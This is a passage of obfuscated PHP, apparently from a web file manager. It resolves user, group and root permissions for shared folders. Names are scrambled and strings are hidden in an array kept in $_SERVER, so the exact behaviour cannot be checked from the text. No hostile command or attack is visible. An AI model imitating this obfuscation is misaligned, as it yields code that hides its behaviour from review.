=> KodIO::make($–Ã£º²ñ[$Ù£¬Ä‘Ä[90]][$Ù£¬Ä‘Ä[194]]), $Ù£¬Ä‘Ä[193] => $Ù£¬Ä‘Ä[231], $Ù£¬Ä‘Ä[191] => $Ù£¬Ä‘Ä[583], $Ù£¬Ä‘Ä[33] => $Ù£¬Ä‘Ä[624], $Ù£¬Ä‘Ä[587] => $–Ã£º²ñ[$Ù£¬Ä‘Ä[594]], $Ù£¬Ä‘Ä[1985] => $–Ã£º²ñ[$Ù£¬Ä‘Ä[1985]], $Ù£¬Ä‘Ä[591] => $–Ã£º²ñ[$Ù£¬Ä‘Ä[193]], $Ù£¬Ä‘Ä[2177] => array($Œåó•¨¢)); $¡íÜ°ù[$ªêàİœŒ[$Ù£¬Ä‘Ä[194]]] = $ªêàİœŒ; } } $·ú÷À¡ = array(); $ÖÉÃ•íä = $this->getAllChildren($­†£µĞ); foreach ($ÖÉÃ•íä as $‹¨“‚¬–) { $ŞÊàĞÊá = !1; foreach ($‹¨“‚¬–[$Ù£¬Ä‘Ä[2177]] as $‡ÙµÜƒ) { if ($‡ÙµÜƒ[$Ù£¬Ä‘Ä[1784]]) { if ($‡ÙµÜƒ[$Ù£¬Ä‘Ä[1784]] == $Š€œ÷óÅ) { $ŞÊàĞÊá = !0; break; } } if ($‡ÙµÜƒ[$Ù£¬Ä‘Ä[1985]]) { if ($this->groupContainUser($‡ÙµÜƒ[$Ù£¬Ä‘Ä[1985]], $Š€œ÷óÅ)) { $ŞÊàĞÊá = !0; break; } } } if ($ŞÊàĞÊá) { $·ú÷À¡[] = $‹¨“‚¬–; } $æÇÅÖı = $‹¨“‚¬–[$Ù£¬Ä‘Ä[194]]; if (isset($¡íÜ°ù[$æÇÅÖı])) { $‹¨“‚¬–[$Ù£¬Ä‘Ä[2177]][] = $¡íÜ°ù[$æÇÅÖı][0]; $¡íÜ°ù[$æÇÅÖı] = !1; } } $¡íÜ°ù = array_filter(array_values($¡íÜ°ù)); $·ú÷À¡ = array_merge($¡íÜ°ù, $·ú÷À¡); return $·ú÷À¡; } public function setAllChildrenByUser($ˆäìùø¼, $Üê¨üå±, $ÌâŞÉ×ù) { $·òš¯‘ =& $_SERVER[«òÑğ]; $¬âÆ×³Ì = $this->getAllChildrenByUser($ˆäìùø¼, $Üê¨üå±); if (!$ÌâŞÉ×ù || !$¬âÆ×³Ì) { return !1; } foreach ($¬âÆ×³Ì as $Î¼ü³•Ô) { $¯»¶ÚÈ¾ = array(); foreach ($Î¼ü³•Ô[$·òš¯‘[2177]] as $Ò®ğÜ³¤) { $şãï–Œü = $Ò®ğÜ³¤[$·òš¯‘[545]]; $£‰¹…ˆ = $Ò®ğÜ³¤[$·òš¯‘[1784]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $»”‡™Ãİ = $Ò®ğÜ³¤[$·òš¯‘[1784]] ? $Ò®ğÜ³¤[$·òš¯‘[1784]] : $Ò®ğÜ³¤[$·òš¯‘[1985]]; if ($Ò®ğÜ³¤[$·òš¯‘[1784]] && $Ò®ğÜ³¤[$·òš¯‘[1784]] == $Üê¨üå±) { continue; } $¯»¶ÚÈ¾[] = array($·òš¯‘[194] => $Î¼ü³•Ô[$·òš¯‘[194]], $·òš¯‘[191] => $£‰¹…ˆ, $·òš¯‘[574] => intval($»”‡™Ãİ), $·òš¯‘[2093] => isset($şãï–Œü[$·òš¯‘[478]]) ? intval($şãï–Œü[$·òš¯‘[478]]) : 0, $·òš¯‘[2157] => isset($şãï–Œü[$·òš¯‘[2157]]) ? intval($şãï–Œü[$·òš¯‘[2157]]) : -1); } $¯»¶ÚÈ¾[] = array($·òš¯‘[194] => $Î¼ü³•Ô[$·òš¯‘[194]], $·òš¯‘[191] => SourceModel::TYPE_USER, $·òš¯‘[574] => intval($Üê¨üå±), $·òš¯‘[2093] => intval($ÌâŞÉ×ù), $·òš¯‘[2157] => -1); $this->where(array($·òš¯‘[494] => $Î¼ü³•Ô[$·òš¯‘[194]]))->delete(); $this->addAll($¯»¶ÚÈ¾); } return !0; } public function get($Å¦¤ÀÅç) { $–ğ¸–¢… = $this->getSourceList(array($Å¦¤ÀÅç), !0); return $–ğ¸–¢…[0]; } public function getSourceList($Ö»«”û°, $‡šâÖİê = false, $ÁÛÌÓï° = false) { $ŸÚ÷µ¤å =& $_SERVER[«òÑğ]; if (!$Ö»«”û°) { return array(); } $ü´¢—Ì• = Model($ŸÚ÷µ¤å[1431]); if (!$‡šâÖİê && count($Ö»«”û°) == 1) { $‡šâÖİê = array(); $‡šâÖİê[$Ö»«”û°[0]] = $ü´¢—Ì•->sourceInfo($Ö»«”û°[0]); } if (!$‡šâÖİê) { $‚Ã´ßÂÒ = array($ŸÚ÷µ¤å[494] => array($ŸÚ÷µ¤å[495], $Ö»«”û°)); $‡šâÖİê = $ü´¢—Ì•->field($ŸÚ÷µ¤å[2181])->where($‚Ã´ßÂÒ)->select(); $‡šâÖİê = array_to_keyvalue($‡šâÖİê, $ŸÚ÷µ¤å[194]); } $›º¶Ó†¿ = $Ö»«”û°; foreach ($‡šâÖİê as $…«çÔ‘ => $‰×üîÌ†) { $¬ƒù¹ıš = $ü´¢—Ì•->parentLevelArray($‰×üîÌ†[$ŸÚ÷µ¤å[589]]); $›º¶Ó†¿ = array_merge($›º¶Ó†¿, array($…«çÔ‘), array_reverse($¬ƒù¹ıš)); } $›º¶Ó†¿ = array_values(array_unique($›º¶Ó†¿)); if (!$›º¶Ó†¿) { return array(); } $¢ª¡’Û™ = $this->sourceAuthSelect($›º¶Ó†¿); $Õ …·î© = array(); foreach ($›º¶Ó†¿ as $ñë’½ì£) { if (isset($¢ª¡’Û™[$ñë’½ì£])) { $Õ …·î©[$ñë’½ì£] = $¢ª¡’Û™[$ñë’½ì£]; } } $Äâ°èÎĞ = $this->userIsRoot($ÁÛÌÓï°); $»¿ê Âš = AuthModel::authAll(); $î‰¤ôÍñ = array($ŸÚ÷µ¤å[491] => $»¿ê Âš, $ŸÚ÷µ¤å[2182] => array($ŸÚ÷µ¤å[496] => 0, $ŸÚ÷µ¤å[1991] => $»¿ê Âš, $ŸÚ÷µ¤å[497] => LNG($ŸÚ÷µ¤å[2183]), $ŸÚ÷µ¤å[2008] => $ŸÚ÷µ¤å[2184])); $Ï‡‡÷…¦ = array(); foreach ($‡šâÖİê as $ñë’½ì£ => $§óûå¿) { if ($Äâ°èÎĞ && $GLOBALS[$ŸÚ÷µ¤å[6]][$ŸÚ÷µ¤å[2004]]) { $Ï‡‡÷…¦[$ñë’½ì£] = $î‰¤ôÍñ; continue; } $Ï‡‡÷…¦[$ñë’½ì£] = $this->makeSourceAuth($§óûå¿, $Õ …·î©, $ÁÛÌÓï°); } return $Ï‡‡÷…¦; } public function authDeepCheck($Ô¯ÀŒßµ, $úÔøìù = false) { $»ØĞÕ´Ñ =& $_SERVER[«òÑğ]; $úÔøìù = $úÔøìù ? $úÔøìù : USER_ID; $Øˆ— ÔĞ = $this->makeAuthDeep($úÔøìù); if (!in_array($Ô¯ÀŒßµ, $Øˆ— ÔĞ[$»ØĞÕ´Ñ[2185]])) { return !1; } $¿ƒ·´İı = array(); foreach ($Øˆ— ÔĞ[$»ØĞÕ´Ñ[2186]] as $¾÷³ó¢² => $÷ÒÙÉ¹‘) { if (!in_array($Ô¯ÀŒßµ, $÷ÒÙÉ¹‘)) { continue; } $¿ƒ·´İı[] = $¾÷³ó¢²; } if (!$¿ƒ·´İı) { return !1; } $¾ïïŞŞÁ = $¿ƒ·´İı ? $¿ƒ·´İı[0] : $Ô¯ÀŒßµ; return array($»ØĞÕ´Ñ[491] => -1, $»ØĞÕ´Ñ[545] => array($»ØĞÕ´Ñ[496] => $»ØĞÕ´Ñ[1283], $»ØĞÕ´Ñ[1991] => $»ØĞÕ´Ñ[231], $»ØĞÕ´Ñ[497] => LNG($»ØĞÕ´Ñ[2187]), $»ØĞÕ´Ñ[2008] => $»ØĞÕ´Ñ[2188]), $»ØĞÕ´Ñ[2189] => LNG($»ØĞÕ´Ñ[2190]), $»ØĞÕ´Ñ[2191] => $this->sourceAuthInfo($¾ïïŞŞÁ)); } protected function makeAuthDeep($‰ä•óòä = false) { $ÁÅøàš® =& $_SERVER[«òÑğ]; static $ïùÀ°úö = array(); $‰ä•óòä = $‰ä•óòä ? $‰ä•óòä : USER_ID; if (isset($ïùÀ°úö[$‰ä•óòä])) { return $ïùÀ°úö[$‰ä•óòä]; } $¥‘ÓÆÕµ = Model($ÁÅøàš®[2192])->listData(); $°õãâ = array(); foreach ($¥‘ÓÆÕµ as $ÉÅè¶¸¨) { if ($ÉÅè¶¸¨[$ÁÅøàš®[490]] == 0 && $ÉÅè¶¸¨[$ÁÅøàš®[2007]] == $ÁÅøàš®[91]) { $°õãâ[] = $ÉÅè¶¸¨[$ÁÅøàš®[478]]; } } $Á›‡ø³ = $this->userGroupParents($‰ä•óòä); $èÙ¯©Ô = array($ÁÅøàš®[191] => SourceModel::TYPE_USER, $ÁÅøàš®[574] => $‰ä•óòä); if ($Á›‡ø³) { $èÙ¯©Ô = array(array($ÁÅøàš®[191] => SourceModel::TYPE_USER, $ÁÅøàš®[574] => $‰ä•óòä), array($ÁÅøàš®[191] => SourceModel::TYPE_GROUP, $ÁÅøàš®[574] => array($ÁÅøàš®[495], $Á›‡ø³)), $ÁÅøàš®[1087] => $ÁÅøàš®[2087]); } $ƒìÚ„‡‰ = $this->field($ÁÅøàš®[2193])->where($èÙ¯©Ô)->select(); $çÂÙâöİ = array(); $ãö¼û¤œ = array_to_keyvalue_group($ƒìÚ„‡‰, $ÁÅøàš®[194]); foreach ($ãö¼û¤œ as $î·ç¦¤œ => $ˆ£Ü×ñ’) { $±¢ò³ò = $this->authArrayCheck($ˆ£Ü×ñ’, $‰ä•óòä); if ($±¢ò³ò[$ÁÅøàš®[491]] > 0) { $çÂÙâöİ[] = $î·ç¦¤œ . $ÁÅøàš®[12]; } } if ($Á›‡ø³) { $ÉÀàß£à = Model($ÁÅøàš®[590]); foreach ($Á›‡ø³ as $¦Äœ¦‹“) { $ˆ—„á = $ÉÀàß£à->getInfo($¦Äœ¦‹“); if (!$ˆ—„á || !is_array($ˆ—„á[$ÁÅøàš®[90]])) { continue; } $çÂÙâöİ[] = $ˆ—„á[$ÁÅøàš®[90]][$ÁÅøàš®[194]]; } } $¸Úß¬íî = array(); $¦°ì¶ôæ = $Á›‡ø³; $ÀÂ’Ï¼È = Model($ÁÅøàš®[1431]); $ÉÀàß£à = Model($ÁÅøàš®[590]); $³…½‘ßê = array(); $ƒù¼­½‘ = array(); $´ˆ”ïÑ = array(); $¸ğûÀ± = array(); if ($çÂÙâöİ) { $üŞĞ£¨  = $ÀÂ’Ï¼È->where(array($ÁÅøàš®[194] => array($ÁÅøàš®[495], $çÂÙâöİ)))->select(); foreach ($üŞĞ£¨  as $µÜ¥ïç¼) { if ($µÜ¥ïç¼[$ÁÅøàš®[508]] == $ÁÅøàš®[91]) { continue; } $öîÅğ²— = $ÀÂ’Ï¼È->parentLevelArray($µÜ¥ïç¼[$ÁÅøàš®[589]]); $¸Úß¬íî = array_merge($¸Úß¬íî, $öîÅğ²—); $¦°ì¶ôæ[] = $µÜ¥ïç¼[$ÁÅøàš®[574]]; $³…½‘ßê[$µÜ¥ïç¼[$ÁÅøàš®[194]]] = $öîÅğ²—; $ƒù¼­½‘[$µÜ¥ïç¼[$ÁÅøàš®[194]]] = $µÜ¥ïç¼[$ÁÅøàš®[574]]; } } $¦°ì¶ôæ = array_values(array_unique($¦°ì¶ôæ)); $ÍìĞ»­å = $¦°ì¶ôæ; foreach ($ÍìĞ»­å as $¦Äœ¦‹“) { $ˆ—„á = $ÉÀàß£à->getInfo($¦Äœ¦‹“); $öîÅğ²— = $ÀÂ’Ï¼È->parentLevelArray($ˆ—„á[$ÁÅøàš®[589]]); $¦°ì¶ôæ = array_merge($¦°ì¶ôæ, $öîÅğ²—); } $¦°ì¶ôæ = array_values(array_unique($¦°ì¶ôæ)); foreach ($¦°ì¶ôæ as $¦Äœ¦‹“) { $ˆ—„á = $ÉÀàß£à->getInfo($¦Äœ¦‹“); $¸Úß¬íî[] = $ˆ—„á[$ÁÅøàš®[90]][$ÁÅøàš®[194]]; $´ˆ”ïÑ[$¦Äœ¦‹“] = $ˆ—„á[$ÁÅøàš®[90]][$ÁÅøàš®[194]]; $¸ğûÀ±[$¦Äœ¦‹“] = $ÀÂ’Ï¼È->parentLevelArray($ˆ—„á[$ÁÅøàš®[589]]); } foreach ($³…½‘ßê as $½õıÃª¾ => $ĞƒÈ“õ´) { $€³ áª¨ = $ƒù¼­½‘[$½õıÃª¾]; if (!$€³ áª¨ || !$´ˆ”ïÑ[$€³ áª¨]) { continue; } $èñëÜØ  = array(); foreach ($¸ğûÀ±[$€³ áª¨] as $¦Äœ¦‹“) { $èñëÜØ [] = $´ˆ”ïÑ[$¦Äœ¦‹“]; } $³…½‘ßê[$½õıÃª¾] = array_merge($èñëÜØ , $ĞƒÈ“õ´); } $¸Úß¬íî = array_values(array_unique($¸Úß¬íî)); $Ÿ²ğŒğ¸ = array($ÁÅøàš®[2185] => $¸Úß¬íî, $ÁÅøàš®[2186] => $³…½‘ßê); $ïùÀ°úö[$‰ä•óòä] = $Ÿ²ğŒğ¸; return $Ÿ²ğŒğ¸; } private function makeSourceAuth($ıØ½¶•Ø, $×ÀÊë¦, $Ù“ïæ = false) { $±Ø–éÙÈ =& $_SERVER[«òÑğ]; $ó‡œÎ” = $±Ø–éÙÈ[91]; $»—©›¸Æ = $ıØ½¶•Ø[$±Ø–éÙÈ[574]]; $¾±æ¤¾Ğ = $ıØ½¶•Ø[$±Ø–éÙÈ[191]] == SourceModel::TYPE_GROUP; $¯Ñç¬©â = $¾±æ¤¾Ğ ? $this->groupRootAuth($»—©›¸Æ, $Ù“ïæ) : !1; if ($¯Ñç¬©â && Model($±Ø–éÙÈ[576])->authCheckAction($¯Ñç¬©â[$±Ø–éÙÈ[490]], $±Ø–éÙÈ[2006])) { return $this->groupAuthInfo($¯Ñç¬©â, $»—©›¸Æ); } $ÍÜ÷×äƒ = Model($±Ø–éÙÈ[1431])->parentLevelArray($ıØ½¶•Ø[$±Ø–éÙÈ[589]]); $ÍÜ÷×äƒ = array_merge(array($ıØ½¶•Ø[$±Ø–éÙÈ[194]]), array_reverse($ÍÜ÷×äƒ)); $ïöú¿ = !1; foreach ($ÍÜ÷×äƒ as $È©÷‘û—) { if (!isset($×ÀÊë¦[$È©÷‘û—])) { continue; } $øñéòò« = $this->authMake($×ÀÊë¦[$È©÷‘û—], $Ù“ïæ); if ($øñéòò«[$±Ø–éÙÈ[545]]) { $ïöú¿ = $øñéòò«; break; } } if (!$¾±æ¤¾Ğ) { return $ïöú¿; } if (!$ïöú¿ && $¯Ñç¬©â) { $ïöú¿ = $this->groupAuthInfo($¯Ñç¬©â, $»—©›¸Æ); } if (!$ïöú¿) { $¦İš‡ıÜ = Model($±Ø–éÙÈ[590])->getInfo($»—©›¸Æ); $¥…Ú‘« = explode($±Ø–éÙÈ[50], trim($¦İš‡ıÜ[$±Ø–éÙÈ[589]], $±Ø–éÙÈ[50])); $¥…Ú‘« = array_reverse($¥…Ú‘«); foreach ($¥…Ú‘« as $ˆÑíÀˆœ) { if ($ˆÑíÀˆœ == $±Ø–éÙÈ[231] || $ˆÑíÀˆœ == $ó‡œÎ”) { continue; } $œä·¦ö = $this->groupRootAuth($ˆÑíÀˆœ, $Ù“ïæ); if (!$œä·¦ö) { continue; } $ïöú¿ = $this->groupAuthInfo($œä·¦ö, $ˆÑíÀˆœ); break; } } if (!$ïöú¿ || $ïöú¿[$±Ø–éÙÈ[491]] <= 0) { $‡’ÁÇöÂ = $this->authDeepCheck($ıØ½¶•Ø[$±Ø–éÙÈ[194]], $Ù“ïæ); if ($‡’ÁÇöÂ) { $ïöú¿ = $‡’ÁÇöÂ; } } return $ïöú¿; } private function userIsRoot($Œ¾Ãæî° = false) { $Á°‘èîŒ =& $_SERVER[«òÑğ]; if (!$Œ¾Ãæî° && KodUser::isRoot()) { return !0; } $œ ê›Õ = Model($Á°‘èîŒ[602])->getInfo($Œ¾Ãæî°); $õõÇÅÜ† = Model($Á°‘èîŒ[2194])->listData($œ ê›Õ[$Á°‘èîŒ[2195]]); if ($õõÇÅÜ† && $õõÇÅÜ†[$Á°‘èîŒ[580]][$Á°‘èîŒ[2196]] == 1) { return !0; } return !1; } private function sourceAuthInfo($…ÇÜí²Ú) { $¦ù°è¤á =& $_SERVER[«òÑğ]; $ˆŠËúÀ  = Model($¦ù°è¤á[1431]); $Î×ª®† = $ˆŠËúÀ ->sourceInfo($…ÇÜí²Ú); if (!$Î×ª®†) { return !1; } $ˆŠËúÀ ->groupPathDisplay($Î×ª®†); $”éø‚°Š = array($Î×ª®†); $”éø‚°Š = $ˆŠËúÀ ->_listAppendPath($”éø‚°Š); $Î×ª®† = $”éø‚°Š[0]; $¢—ë–Ó• = $Î×ª®†[$¦ù°è¤á[587]]; if (isset($Î×ª®†[$¦ù°è¤á[595]])) { $À³¡³Œô = explode($¦ù°è¤á[8], trim($Î×ª®†[$¦ù°è¤á[587]], $¦ù°è¤á[8])); array_shift($À³¡³Œô); $¢—ë–Ó• = $Î×ª®†[$¦ù°è¤á[593]] . $¦ù°è¤á[2197] . implode($¦ù°è¤á[8], $À³¡³Œô); } return array($¦ù°è¤á[497] => $Î×ª®†[$¦ù°è¤á[32]], $¦ù°è¤á[87] => KodIO::make($Î×ª®†[$¦ù°è¤á[194]]), $¦ù°è¤á[2198] => $¢—ë–Ó•); } private function groupAuthInfo($Ëñ‘âë, $Ù…Ùµ¾Ø) { $¼¥¤Èíù =& $_SERVER[«òÑğ]; $‡ıŞ—”Â = Model($¼¥¤Èíù[590])->getInfo($Ù…Ùµ¾Ø); return array($¼¥¤Èíù[2199] => intval($Ëñ‘âë[$¼¥¤Èíù[490]]), $¼¥¤Èíù[2182] => $Ëñ‘âë, $¼¥¤Èíù[2200] => LNG($¼¥¤Èíù[2201]), $¼¥¤Èíù[2191] => array($¼¥¤Èíù[497] => $‡ıŞ—”Â[$¼¥¤Èíù[32]], $¼¥¤Èíù[87] => KodIO::make($‡ıŞ—”Â[$¼¥¤Èíù[90]][$¼¥¤Èíù[194]]), $¼¥¤Èíù[2198] => $‡ıŞ—”Â[$¼¥¤Èíù[594]])); } protected function groupRootAuth($“–ÀÊÑè, $Ö¢‘Ã„ = false) { $È«üåŠÉ =& $_SERVER[«òÑğ]; $Ö¢‘Ã„ = $Ö¢‘Ã„ ? $Ö¢‘Ã„ : USER_ID; $…†ãŠŒŒ = $Ö¢‘Ã„ . $È«üåŠÉ[2202] . $“–ÀÊÑè; static $øë€ü = array(); if (isset($øë€ü[$…†ãŠŒŒ])) { return $øë€ü[$…†ãŠŒŒ]; } $ó»…€Ûç = Model($È«üåŠÉ[590])->getInfo($“–ÀÊÑè); $ŸşÙö¬© = $this->userGroupList($Ö¢‘Ã„); $±¹¸¨ˆ = isset($ŸşÙö¬©[$“–ÀÊÑè]) ? $ŸşÙö¬©[$“–ÀÊÑè][$È«üåŠÉ[490]] : !1; if ($±¹¸¨ˆ && Model($È«üåŠÉ[576])->authCheckAction($±¹¸¨ˆ[$È«üåŠÉ[490]], $È«üåŠÉ[2006])) { $øë€ü[$…†ãŠŒŒ] = $±¹¸¨ˆ; return $±¹¸¨ˆ; } $âĞïºãˆ = $this->sourceAuthSelect($ó»…€Ûç[$È«üåŠÉ[90]][$È«üåŠÉ[194]]); $‡´¾¢¢ = $âĞïºãˆ ? $this->authMake($âĞïºãˆ, $Ö¢‘Ã„) : !1; $Ú·ëÄ¦± = $‡´¾¢¢ ? $‡´¾¢¢[$È«üåŠÉ[545]] : !1; $øë€ü[$…†ãŠŒŒ] = $Ú·ëÄ¦± ? $Ú·ëÄ¦± : $±¹¸¨ˆ; return $øë€ü[$…†ãŠŒŒ]; } public function authOwnerApply($òë­è¿Í) { $ı¾Ğ«ß¤ =& $_SERVER[«òÑğ]; if (empty($òë­è¿Í[$ı¾Ğ«ß¤[490]]) || isset($òë­è¿Í[$ı¾Ğ«ß¤[2203]]) && $òë­è¿Í[$ı¾Ğ«ß¤[2203]]) { return $òë­è¿Í; } if (AuthModel::authCheckRoot($òë­è¿Í[$ı¾Ğ«ß¤[490]][$ı¾Ğ«ß¤[491]])) { return $òë­è¿Í; } $Óéä×ëØ = Model($ı¾Ğ«ß¤[1431])->parentLevelArray($òë­è¿Í[$ı¾Ğ«ß¤[589]]); $Óéä×ëØ = array_merge(array($òë­è¿Í[$ı¾Ğ«ß¤[194]]), array_reverse($Óéä×ëØ)); $•éşÀíÜ = $this->sourceAuthSelect($Óéä×ëØ); $ôºÛê½İ = array(); $°¥«ó¶¢ = array(); foreach ($•éşÀíÜ as $¾õõ‡Ç => $ãàö‚ú„) { $“Ä“„å = $this->authFolderOwnerUser($ãàö‚ú„); $ôºÛê½İ[$¾õõ‡Ç] = $“Ä“„å; $°¥«ó¶¢ = array_merge($°¥«ó¶¢, $“Ä“„å[$ı¾Ğ«ß¤[670]]); if ($“Ä“„å[$ı¾Ğ«ß¤[2204]]) { break; } } if (count($°¥«ó¶¢) == 0) { $°¥«ó¶¢ = $this->authFolderOwnerGroup($òë­è¿Í[$ı¾Ğ«ß¤[574]]); } $°¥«ó¶¢ = array_unique($°¥«ó¶¢); if (AuthModel::authCheckRoot($òë­è¿Í[$ı¾Ğ«ß¤[490]][$ı¾Ğ«ß¤[491]])) { $°¥«ó¶¢[] = USER_ID; } $òë­è¿Í[$ı¾Ğ«ß¤[490]][$ı¾Ğ«ß¤[2205]] = Model($ı¾Ğ«ß¤[582])->userListInfo($°¥«ó¶¢); return $òë­è¿Í; } private function authFolderOwnerGroup($¿ÛöıŞ) { $×ÂÉ²­ =& $_SERVER[«òÑğ]; $«‡Ì’ãÇ = Model($×ÂÉ²­[2079])->where(array($×ÂÉ²­[1985] => $¿ÛöıŞ))->select(); $¿ç„‹âŸ = array(); if (!$«‡Ì’ãÇ) { return $¿ç„‹âŸ; } foreach ($«‡Ì’ãÇ as $õÔ‘²ÒŠ) { $°úèÏš™ = $this->authInfo($õÔ‘²ÒŠ); if (AuthModel::authCheckRoot($°úèÏš™[$×ÂÉ²­[490]])) { $¿ç„‹âŸ[] = $õÔ‘²ÒŠ[$×ÂÉ²­[1784]]; } } return $¿ç„‹âŸ; } private function authFolderOwnerUser($˜Îöí) { $±¬º«Ú =& $_SERVER[«òÑğ]; $‚Ğê = array(); $ƒ¾ÀéáÜ = !1; foreach ($˜Îöí as $ƒüëØâ˜) { $· Ÿãì‰ = $this->authInfo($ƒüëØâ˜); if ($ƒüëØâ˜[$±¬º«Ú[574]] == $±¬º«Ú[231]) { $ƒ¾ÀéáÜ = !0; } if ($ƒüëØâ˜[$±¬º«Ú[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($· Ÿãì‰[$±¬º«Ú[490]])) { $‚Ğê[] = $ƒüëØâ˜[$±¬º«Ú[574]]; } } } return array($±¬º«Ú[670] => $‚Ğê, $±¬º«Ú[2204] => $ƒ¾ÀéáÜ); } public function authMake($Î”ô¬­¢, $Ø¼ó¡ì¬ = false) { $‹¡áƒƒÂ =& $_SERVER[«òÑğ]; $ÍÅø¼š´ = $this->authArrayCheck($Î”ô¬­¢, $Ø¼ó¡ì¬); if ($ÍÅø¼š´[$‹¡áƒƒÂ[2206]]) { $ÍÅø¼š´[$‹¡áƒƒÂ[2206]] = $this->sourceAuthInfo($ÍÅø¼š´[$‹¡áƒƒÂ[2206]]); } return $ÍÅø¼š´; } public function authArrayCheck($âõ¦ØŞÁ, $¶á—äŠ® = false) { $¤¾âÈ¥Ó =& $_SERVER[«òÑğ]; if (!$âõ¦ØŞÁ) { return array($¤¾âÈ¥Ó[491] => 0, $¤¾âÈ¥Ó[545] => !1); } $¶á—äŠ® = $¶á—äŠ® ? $¶á—äŠ® : USER_ID; $ùàÊŸó“ = 0; $¿öòÕÑ‹ = 0; $¾»×–Æ = 0; $¬’ò†×† = 0; $¾Üº±ñÊ = 0; $ıå‰…üí = 0; $ÙØô¬… = 1000; $Èòğ‘„ = 0; $ÈŠÜŠÎ = 0; $û¤Í¬Ñ€ = 0; $ÈïÏØ¦ = 0; $¡ÔâÀÓ¼ = array($¤¾âÈ¥Ó[194] => 0); foreach ($âõ¦ØŞÁ as $¡ÔâÀÓ¼) { $Êƒ›İÕô = $this->authInfo($¡ÔâÀÓ¼); if (!$Êƒ›İÕô) { continue; } $ö¢ÕéÜØ = $¡ÔâÀÓ¼[$¤¾âÈ¥Ó[574]]; $ —«¿¡› = intval($Êƒ›İÕô[$¤¾âÈ¥Ó[490]]); if ($¡ÔâÀÓ¼[$¤¾âÈ¥Ó[191]] == SourceModel::TYPE_USER && $ö¢ÕéÜØ == $¶á—äŠ®) { $ùàÊŸó“ = !0; $¾»×–Æ = $Êƒ›İÕô; $¿öòÕÑ‹ = $ —«¿¡›; } else { if ($¡ÔâÀÓ¼[$¤¾âÈ¥Ó[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ö¢ÕéÜØ, $¶á—äŠ®)) { $¬’ò†×† = !0; $¾óÏÀº = $this->groupStepToUserGroup($ö¢ÕéÜØ, $¶á—äŠ®); if ($¾óÏÀº < $ÙØô¬…) { $ÙØô¬… = $¾óÏÀº; $¾Üº±ñÊ = $ —«¿¡›; $ıå‰…üí = $Êƒ›İÕô; $Èòğ‘„ = $ö¢ÕéÜØ; } if ($¾óÏÀº == $ÙØô¬… && $ —«¿¡› >= $¾Üº±ñÊ) { $¾Üº±ñÊ = $ —«¿¡›; $ıå‰…üí = $Êƒ›İÕô; $Èòğ‘„ = $ö¢ÕéÜØ; } } else { if ($ö¢ÕéÜØ == $¤¾âÈ¥Ó[231]) { $ÈŠÜŠÎ = !0; $ÈïÏØ¦ = $Êƒ›İÕô; $û¤Í¬Ñ€ = $ —«¿¡›; } } } } if ($ùàÊŸó“) { $¨¥å‘Õè = $¿öòÕÑ‹; $Êƒ›İÕô = $¾»×–Æ; $ƒíûé©ì = LNG($¤¾âÈ¥Ó[2207]); } else { if ($¬’ò†×†) { $¨¥å‘Õè = $¾Üº±ñÊ; $Êƒ›İÕô = $ıå‰…üí; $éÏû©á£ = Model($¤¾âÈ¥Ó[590])->getInfo($Èòğ‘„); $ƒíûé©ì = $¤¾âÈ¥Ó[176] . $éÏû©á£[$¤¾âÈ¥Ó[594]] . $¤¾âÈ¥Ó[2208] . LNG($¤¾âÈ¥Ó[2209]); } else { if ($ÈŠÜŠÎ) { $¨¥å‘Õè = $û¤Í¬Ñ€; $Êƒ›İÕô = $ÈïÏØ¦; $ƒíûé©ì = LNG($¤¾âÈ¥Ó[2179]); } else { $¨¥å‘Õè = 0; $Êƒ›İÕô = !1; $ƒíûé©ì = $¤¾âÈ¥Ó[12]; } } } $İ¨ãµÉç = array($¤¾âÈ¥Ó[2199] => intval($¨¥å‘Õè), $¤¾âÈ¥Ó[2182] => $Êƒ›İÕô, $¤¾âÈ¥Ó[2200] => $ƒíûé©ì, $¤¾âÈ¥Ó[2191] => $¡ÔâÀÓ¼[$¤¾âÈ¥Ó[194]]); return $İ¨ãµÉç; } private function groupContainUser($ˆ¡ŸËÈ, $º˜î‰¸í = false) { return in_array($ˆ¡ŸËÈ, $this->userGroupParents($º˜î‰¸í)); } private function groupStepToUserGroup($ÕåÁÌÒ, $ŸÊµÇÊş = false) { $±’­üÚĞ =& $_SERVER[«òÑğ]; $§ã¾û±› = $this->userGroupList($ŸÊµÇÊş); $–®ÏüÜÊ = 1000; $ÌœâÓ‡Ü = $GLOBALS[$±’­üÚĞ[6]][$±’­üÚĞ[92]][$±’­üÚĞ[2092]] == 1; $¢ÏÕÈãé = $ÌœâÓ‡Ü ? 3 : 2; foreach ($§ã¾û±› as $æÌ¿“) { if ($æÌ¿“[$±’­üÚĞ[1985]] == $ÕåÁÌÒ) { return 0; } $äÚëİ÷ = explode($±’­üÚĞ[50], trim($æÌ¿“[$±’­üÚĞ[589]], $±’­üÚĞ[50])); if ($äÚëİ÷[0] == $±’­üÚĞ[231] && count($äÚëİ÷) > $¢ÏÕÈãé) { $ì“Õé» = array_reverse(array_slice($äÚëİ÷, $¢ÏÕÈãé)); $š¥ÉáÜ‰ = array_search($ÕåÁÌÒ, $ì“Õé»); if ($š¥ÉáÜ‰ !== !1 && $š¥ÉáÜ‰ + 1 <= $–®ÏüÜÊ) { $–®ÏüÜÊ = $š¥ÉáÜ‰ + 1; } } } return $–®ÏüÜÊ; } private function userGroupList($ÔÂÅúğª = false) { $¹ë÷ıÅô =& $_SERVER[«òÑğ]; static $·Œğ‘ º = array(); if (isset($·Œğ‘ º[$ÔÂÅúğª])) { return $·Œğ‘ º[$ÔÂÅúğª]; } $‘½¦‡¶Ú = Model($¹ë÷ıÅô[602])->getInfo($ÔÂÅúğª); $·Œğ‘ º[$ÔÂÅúğª] = array_to_keyvalue($‘½¦‡¶Ú[$¹ë÷ıÅô[2180]], $¹ë÷ıÅô[1985]); return $·Œğ‘ º[$ÔÂÅúğª]; } public function userGroupParents($—âÉî©) { $“õ§¼ =& $_SERVER[«òÑğ]; static $“¾è…ä§ = array(); $—âÉî© = $—âÉî© ? $—âÉî© : USER_ID; if (isset($“¾è…ä§[$—âÉî©])) { return $“¾è…ä§[$—âÉî©]; } $ÍÒ°ëÌ = $this->userGroupList($—âÉî©); $¨æÉÅŞ = array(); $Óµˆ“ƒ¨ = $GLOBALS[$“õ§¼[6]][$“õ§¼[92]][$“õ§¼[2092]] == 1; $¨îêÌ‹ = $Óµˆ“ƒ¨ ? 3 : 2; foreach ($ÍÒ°ëÌ 